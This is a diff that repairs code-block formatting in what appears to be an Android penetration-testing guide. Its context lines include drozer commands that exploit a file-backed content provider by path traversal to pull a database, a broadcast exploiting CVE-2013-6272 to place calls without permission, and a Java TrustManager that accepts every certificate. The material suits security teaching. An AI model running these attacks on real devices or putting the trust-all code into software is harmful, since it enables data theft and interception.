@@ -198,7 +198,8 @@ Implementing a content provider that allows other applications to retrieve files
 127.0.0.1 localhost
 ```
 
-```dz> run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/data/data/com.mwr.example.sieve/databases/database.db > database.db
+```
+dz> run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/data/data/com.mwr.example.sieve/databases/database.db > database.db
 ```
 
 A scanner module in drozer allows you to detect directory traversal attacks against file-backed content providers as shown here:
@@ -296,7 +297,8 @@ Broadcasts were intended to reach one or more recipients, unlike the sending of 
 
 CVE-2013-6272 INITIATE OR TERMINATE CALLS WITHOUT APPROPRIATE PERMISSIONS ON ANDROID 4.4.2 AND EARLIER:
 
-```dz> run app.broadcast.send --component com.android.phone com.android.phone.PhoneGlobals$NotificationBroadcastReceiver --action com.android.phone.ACTION_CALL_BACK_FROM_NOTIFICATION --data-uri tel:123456789 
+```
+dz> run app.broadcast.send --component com.android.phone com.android.phone.PhoneGlobals$NotificationBroadcastReceiver --action com.android.phone.ACTION_CALL_BACK_FROM_NOTIFICATION --data-uri tel:123456789 
 ```
 
 - Intent Sniffing
@@ -339,7 +341,7 @@ https://www.isecpartners.com/tools/mobile-security/intent-sniffer.aspx
 
 The TrustManager’s job is to ensure that the information provided by the server matches conditions deemed acceptable to establish a trusted connection. The following code completely nullifies this check:
 
-``	
+```	
 	TrustManager[] trustAllCerts = new TrustManager[] { 
 	new X509TrustManager() 
 	{ 
@@ -361,7 +363,7 @@ The TrustManager’s job is to ensure that the information provided by the serve
 	}}; 
 	 
 	context.init(null, trustAllCerts, new SecureRandom()); 
-``	
+```	
 ------------
 ```
 	X509TrustManager local1 = new X509TrustManager() 
